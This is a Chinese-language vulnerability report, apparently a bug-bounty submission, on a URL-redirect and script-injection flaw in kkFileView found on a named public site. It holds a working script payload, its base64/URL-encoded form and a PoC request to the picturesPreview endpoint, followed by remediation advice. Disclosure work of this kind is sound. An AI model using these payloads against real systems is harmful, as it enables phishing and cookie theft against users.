# 一



具体描述如下：

危害性: 导致用户被钓鱼攻击，可获得应用系统cookie等敏感信息，可获取应用系统登陆权限。

重现性: 攻击者可以重复攻击造成危害，但受到权限、时间等其它不可控因素的限制。

可利用性：初学者短期能掌握攻击方法，漏洞利用程序或脚本已公开，攻击者无需掌握相关漏洞原理，使用获取到相关脚本即可一键利用。

受影响用户: 所有用户-能够控制或接管业务系统所有普通用户或者管理员用户并造成危害。

可发现性: 漏洞可轻易被发现-漏洞在公网且可以通过搜索引擎发现并造成实际危害。







1、通过目录扫描扫出https://onehall.cn/preview/index

访问发现是kkFileView。

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image002.jpg)

2、构建payload

<script>window.location.href="https://www.qq.com";</script>

编码base64并url编码:

PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cucXEuY29tIjs8L3NjcmlwdD4%3D

POC:

picturesPreview?urls=PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cucXEuY29tIjs8L3NjcmlwdD4%3D

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image004.jpg)

可以看到成功跳转到目标网址

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image006.jpg)

五、修复建议

1.若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；

2.若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg首先需要进行验证签名通过才能进行跳转；

3.若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：即控制url是否是授权的白名单。







# 二

1、通过目录扫描扫出https://onehall.cn/preview/index

访问发现是kkFileView。

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image002-1736751216046-1.jpg)

2、下载地址预览文件处存在URL任意跳转漏洞

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image004-1736751216046-2.jpg)

POC：

<script>window.location.href="https://www.qq.com";</script>

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image006-1736751216046-3.jpg)

可以看到成功跳转到目标网址

![img](kkfileview%20url%E8%B7%B3%E8%BD%AC.assets/clip_image008.jpg)